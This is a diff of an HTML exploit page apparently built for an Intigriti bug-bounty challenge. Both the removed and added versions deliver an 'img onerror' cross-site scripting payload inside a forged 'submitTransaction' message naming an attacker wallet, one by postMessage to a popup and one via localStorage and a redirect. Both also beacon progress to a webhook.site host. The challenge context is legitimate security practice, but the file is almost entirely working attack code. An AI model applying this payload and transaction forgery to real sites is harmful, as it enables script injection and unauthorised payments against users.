@@ -1,50 +1,35 @@
 <!DOCTYPE html>
-<html><head><title>Popup Exploit</title></head>
+<html><head><title>Redirect Exploit</title></head>
 <body>
-<h2>Opening checkout...</h2>
+<h2>Loading...</h2>
 <script>
 const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
 const WALLET = '16472226db03703a192aa383237035a69f';
 
-function report(step, data) {
-    fetch(WEBHOOK + '?s=' + step + '&d=' + btoa(JSON.stringify(data||{}))).catch(()=>{});
-}
+// Log that we started
+fetch(WEBHOOK + '?step=START&wallet=' + WALLET);
 
-report('1_LOADED', {});
-
-// Use window.open instead of iframe
-setTimeout(function() {
-    report('2_OPENING_WINDOW', {});
-    
-    const win = window.open(
-        'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1',
-        '_blank'
-    );
-    
-    if (win) {
-        report('3_WINDOW_OPENED', {});
-        
-        setTimeout(function() {
-            try {
-                win.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: WALLET,
-                        currency: '1337COIN',
-                        amount: 1,
-                        nickname: '<img src=x onerror="alert(\'gigawatz\')">'
-                    }
-                }, 'https://challenge-0126.intigriti.io');
-                
-                report('4_POSTMESSAGE_SENT', {});
-            } catch(e) {
-                report('4_ERROR', {msg: e.message});
-            }
-        }, 3000);
-    } else {
-        report('3_BLOCKED', {});
+// The exploit is injected via URL fragment
+// The checkout page will read this and execute
+const exploitData = {
+    type: 'submitTransaction',
+    transaction: {
+        toAddress: WALLET,
+        currency: '1337COIN',
+        amount: 1,
+        nickname: '<img src=x onerror="alert(\'gigawatz\')">'
     }
-}, 1000);
+};
+
+// Store in localStorage for the target page to pick up
+try {
+    localStorage.setItem('intigriti_exploit', JSON.stringify(exploitData));
+} catch(e) {}
+
+// Direct redirect - no iframe
+setTimeout(function() {
+    window.location.href = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+}, 500);
 </script>
 </body>
 </html>
